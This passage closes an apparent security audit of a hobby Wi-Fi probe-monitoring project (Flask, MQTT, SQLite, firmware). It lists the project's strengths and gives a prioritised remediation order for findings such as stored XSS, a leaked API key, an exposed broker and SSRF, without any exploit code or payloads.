- **Rate limiting and CORS in place.** Flask-Limiter with sensible per-endpoint limits (tighter on config/test endpoints) and an allow-listed CORS origin set show security awareness.
- **SQLite done reasonably.** WAL mode, tuned PRAGMAs, thread-local connections, and an OUI-vendor enrichment path are nice touches for a hobby backend.
- **Good operator ergonomics.** A self-documenting OpenAPI spec + Swagger page, CSV/JSON export, live dashboard with charts, a mock node for local testing, and helper scripts (`flash.sh`, `logging.sh`, OUI updater) make the project pleasant to run and extend.
- **Defensive instincts already present** — per-send try/except in the notifier, JSON-decode fallback in config, handled bad-JSON in the MQTT client — show the author thinks about failure modes; the gaps are about *untrusted-input* boundaries rather than carelessness.

---

## Recommended fix order

1. **Kill the stored XSS (Critical).** Add `escapeHtml` to `shared.js`; escape `ssid`/`node`/`mac`/`vendor`/`type` in `alerts.js`, `dashboard.js`, `probes.js`, `devices.js`, `nodes.js`, and the `fmtMac`/`typeBadge` helpers. Highest impact, lowest risk, ~30 minutes.
2. **Fail closed on auth + stop leaking the key (High).** Refuse to start (or bind localhost-only) when `API_KEY` is unset; remove `{{ api_key }}` from templates and move dashboard auth to an `HttpOnly` session cookie with CSRF on POSTs.
3. **Stop exposing the broker (High).** Drop `1883:1883` from compose (or enable `allow_anonymous false` + per-node creds/ACLs/TLS).
4. **Validate ingress and config writes (High).** Normalize MQTT payloads in `on_alert` (dict guard, type allow-list, MAC/node/SSID checks) and schema-validate `POST /api/config`; validate notifier destinations + `allow_redirects=False` to close the SSRF.
5. **Fix the fresh-clone Docker breakage (High).** Move the DB to a `./data` dir/named volume so `docker compose up` works on a clean checkout.
6. **Harden the deployment (Medium).** Gunicorn instead of the dev server, non-root `USER`, `HEALTHCHECK`; redact secrets in `GET /api/config`.
7. **Close the firmware detection gaps (Medium).** Shrink the upload blind window + urgent-flush path; gate karma suppression on `legitTbl`; cap `upsert_device` arrays; make the notifier worker crash-proof and timestamp-safe.
8. **Documentation truth-up (Medium/Low).** Fix the "API key required", single-channel, `credentials.h`, and config-filename claims so a new user can actually stand the project up.
9. **Low/Info cleanups.** Constant-time key compare, `SECRET_KEY` default, CSV formula-injection, Telegram HTML escaping, the firmware wrap-safe-eviction / sliding-window correctness fixes, and the shared-helper/duplication refactors — batch these opportunistically.